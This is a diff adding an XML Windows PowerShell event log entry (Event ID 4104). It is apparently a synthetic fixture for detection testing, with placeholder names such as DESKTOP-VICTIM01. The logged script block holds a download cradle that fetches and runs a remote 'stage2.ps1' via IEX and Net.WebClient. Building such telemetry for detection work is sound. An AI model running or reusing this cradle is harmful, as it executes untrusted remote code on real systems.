@@ -1,0 +1,26 @@
+<Events>
+  <Event xmlns="http://schemas.microsoft.com/win/2004/08/events/event">
+    <System>
+      <Provider Name="Microsoft-Windows-PowerShell" Guid="{A0C1853B-5C40-4B15-8766-3CF1C58F985A}"/>
+      <EventID>4104</EventID>
+      <Version>1</Version>
+      <Level>5</Level>
+      <Task>2</Task>
+      <Opcode>15</Opcode>
+      <Keywords>0x0</Keywords>
+      <TimeCreated SystemTime="2023-04-10T14:22:15.8000000Z"/>
+      <EventRecordID>30001</EventRecordID>
+      <Execution ProcessID="4104" ThreadID="5512"/>
+      <Channel>Microsoft-Windows-PowerShell/Operational</Channel>
+      <Computer>DESKTOP-VICTIM01</Computer>
+      <Security UserID="S-1-5-21-12345678-12345678-12345678-1001"/>
+    </System>
+    <EventData>
+      <Data Name="MessageNumber">1</Data>
+      <Data Name="MessageTotal">1</Data>
+      <Data Name="ScriptBlockText">IEX (New-Object Net.WebClient).DownloadString('http://198.51.100.2/stage2.ps1')</Data>
+      <Data Name="ScriptBlockId">01234567-89AB-CDEF-0123-456789ABCDEF</Data>
+      <Data Name="Path">C:\Users\victim\AppData\Local\Temp\loader.ps1</Data>
+    </EventData>
+  </Event>
+</Events>
